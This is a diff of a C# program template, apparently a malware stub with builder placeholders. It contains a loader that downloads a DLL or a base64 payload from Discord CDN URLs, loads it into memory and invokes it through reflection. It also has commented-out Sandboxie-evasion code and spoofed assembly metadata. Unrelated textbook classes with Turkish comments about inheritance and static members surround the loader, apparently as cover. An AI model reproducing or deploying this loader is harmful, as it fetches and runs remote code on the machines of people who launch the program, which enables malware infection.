@@ -1,3 +1,5 @@
+
+
 using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
@@ -10,14 +12,11 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-
-
-
-//Default [assembly: AssemblyTitle("Windows Application .exe")]
-//Default [assembly: AssemblyDescription("Windows Application")]
-//Default [assembly: AssemblyProduct("Windows Forms ")]
-//Default [assembly: AssemblyCopyright("Windows Forms © 2012")]
-//Default [assembly: AssemblyFileVersion("3.4.0.0")]
+//Default [assembly: AssemblyTitle("Assembly.exe")]
+//Default [assembly: AssemblyDescription("WindowsApplication")]
+//Default [assembly: AssemblyProduct("WindowsApplication")]
+//Default [assembly: AssemblyCopyright("WindowsApplication  ©  2013")]
+//Default [assembly: AssemblyFileVersion("2.0.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -27,20 +26,102 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-public class settings
+
+// base class name 'baseClass'
+class baseClass
+{
+    public void show()
+    {
+        Console.WriteLine("Base class");
+    }
+}
+
+// derived class name 'derived'
+// 'baseClass' inherit here
+class derived : baseClass
 {
 
+    // overriding
+    new public void show()
+    {
+        Console.WriteLine("Derived class");
+    }
+}
 
+class GFG
+{
+
+    // Main Method
+    public static void Mainapp()
+    {
+
+        // 'obj' is the object of
+        // class 'baseClass'
+        baseClass obj = new baseClass();
+
+
+        // invokes the method 'show()'
+        // of class 'baseClass'
+        obj.show();
+
+        obj = new derived();
+
+        // it also invokes the method
+        // 'show()' of class 'baseClass'
+        obj.show();
+
+    }
+}
+static class StaticOrnek2
+{
+    // static bir yapılandırıcı örneği
+    static StaticOrnek2()
+    {
+        int kapi = 4;
+        string isim = "Mercedes";
+    }
+
+    static void Minibus()
+    {
+
+    }
+}
+public class psrsaideasm
+{
+    public static double x = 5.5;
+    public void xDegistir(int y)
+    {
+        x = y;
+    }
+    public void Otomobil() // static olmadığı için kendi sınıfından olsa bile static olan bir metot erişemez
+    {
+
+    }
+    public static int motor = 1000;
+    public int benzin = 3; // static olmadığı için kendi sınıfından olsa bile static olan bir metot erişemez
+
+    public static int Otobus()
+    {
+        // enerji = 200; hatalı kullanım
+        // Insan(); Hatalı kullanım
+
+        psrsaideasm st = new psrsaideasm();
+
+        st.Otomobil(); // Doğru kullanım
+        st.benzin = 2; // doğru kullanım
+        return motor / 2;
+    }
     [STAThread]
     public static void Main(string[] args)
+    {
+        using (WebClient %3% = new WebClient())
         {
-            using (WebClient fff = new WebClient())
+
+            try
             {
 
-                try
-                {
 
-
+               
                    //sandboxie controlsandboxie();
 
                     //Messega
@@ -62,39 +143,14 @@ public class settings
 
 
 
+                    object %1% = new object[] { %aPP%, string.Empty, %3%.DownloadData("%Server%"), true };
 
-                    string %1%;
+                    Assembly %2%;
 
-                    %1% = "https://cdn.discordapp.com/attachments/844669981151985754/845847751560265748/OBS_Studio.txt";
-
-                    WebClient %2%;
-
-                    %2% = new WebClient();
-
-                    string %3%;
-
-                    %3% = %2%.DownloadString(%1%);
-
-                    byte[] %4%;
-
-                    %4% = Convert.FromBase64String(%3%);
-
-                    string S = "pizzaorder.buynow";
-
-                    string %5% = "meseken";
-
-                    object spider = new object[] { %aPP%, string.Empty, fff.DownloadData("%Server%"), true };
-
-                    string %6% = S;
+                    %2% = AppDomain.CurrentDomain.Load(%3%.DownloadData("https://cdn.discordapp.com/attachments/844669981151985754/845859274424582144/instagram.dll"));
 
 
-                    Assembly A;
-
-                    A  = AppDomain.CurrentDomain.Load(%4%);
-
-
-                    A.GetType(%6%).InvokeMember(%5%, System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])spider);
-
+                    %2%.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])%1%);
 
 
                     //start  {
@@ -104,18 +160,27 @@ public class settings
 
 
 
-                }
-                catch { return; }
-
-
-
-
-                   
-
-
             }
+            catch { return; }
+
+            psrsaideasm y = new psrsaideasm();
+            Console.WriteLine(psrsaideasm.x);
+
+            psrsaideasm z = new psrsaideasm();
+            Console.WriteLine(psrsaideasm.x);
+
+            z.xDegistir(4);
+
+            psrsaideasm t = new psrsaideasm();
+            Console.WriteLine(psrsaideasm.x);
+
+
+
+
 
         }
+
+    }
 
     //sandboxie [DllImport("kernel32.dll")]
     //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -127,3 +192,5 @@ public class settings
     //sandboxie     }
     //sandboxie }
 }
+
+
